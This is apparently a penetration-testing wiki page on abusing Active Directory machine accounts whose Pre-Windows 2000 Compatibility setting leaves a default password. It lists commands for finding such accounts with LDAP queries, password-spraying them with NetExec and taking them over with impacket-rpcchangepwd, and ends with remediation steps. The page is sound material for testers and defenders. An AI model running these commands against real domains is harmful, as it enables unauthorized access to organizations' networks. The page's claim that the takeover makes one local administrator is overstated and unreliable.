---
layout: default
title: Pre Windows 2000 Compatibility Abuse
parent: Active Directory
nav_order: 3
permalink: /ad/compatibility/
---

# Pre Windows 2000 Compatibility Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Domain machine accounts that have the option *Pre Windows 2000 Compatibility* enabled have default password which corresponds to the computer name without the trailing `$`.

```powershell
# If the computer domain account is...
$DomainName/COMPUTER-NAME$

# ...the password will be.
computer-name
```

{: .important }
> It's not because the machine account exists in the domain that the actual related machine exists. In most cases, vulnerable domain machine accounts referred to old decommissioned machines. Still, you can use vulnerable accounts to gain an initial foothold into the domain or to perform [Role-Based Constrained Delegation](/ad/rbconstrained/)

## Prerequisites

- Network route to the domain controller.

## Exploit

If you already have a domain account, you can lookup on domain computers that have this option enabled using [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) or [ADSearch](https://github.com/tomcarver16/ADSearch).

```bash
./ldapsearch-ad.py -l $DomainControllerIP -d $Domain -u $Username -p $Password -t search -s '(userAccountControl=4128)'

./ADSearch.exe --search "(userAccountControl=4128)"
```

Alternatively, you can perform [Password Spraying](/ad/spraying/) on all domain computers after having [retrieved the list of domain computers](/ad/enumeration/). **Don't forget to add the trailing `$` at the end of computer names.**

```bash
nxc smb $DomainControllerIP -d $Domain -u ComputerNames.txt -p Passwords.txt --no-bruteforce --continue-on-success
```

Otherwise, if you don't have any domain account for the moment, you can simply lookup on IPs to identify domain computer names before performing [Password Spraying](/ad/spraying) command above.

```bash
# Considering ComputersIPs.txt contains a list of IPs, one per line.
# $DNSServer should correspond in most cases to the domain controller IP.
for IP in $(cat ComputersIPs.txt); do host $IP $DNSServer; done > ComputerNames.txt
```

If you are using [NetExec](https://github.com/Pennyw0rth/NetExec), authentication attempts with error `WORKSTATION_TRUST_ACCOUNT` mean it is a Pre-Windows 2000 computer. Once you identify a vulnerable domain machine account, you will have to change its password. You can do it using [impacket-rpcchangepwd](https://github.com/fortra/impacket/pull/1304/commits/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6).

```bash
impacket-rpcchangepwd $Domain/$ComputerName$:$ComputerNameInLowerCase@$DomainControllerIP -newpass $NewPassword
```

**TA-DA!** You are now local administrator of this machine. Plus, if were not authenticated in the domain yet, it's now the case. So let's [enumerate the domain](/ad/enumeration)!

## Useful links

- [Interesting article](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts) explaining the vulnerability.

## Recommendations

- [ ] Change default credentials for concerned domain machine accounts.
- [ ] Remove or disable domain accounts for computers that have been decommissioned.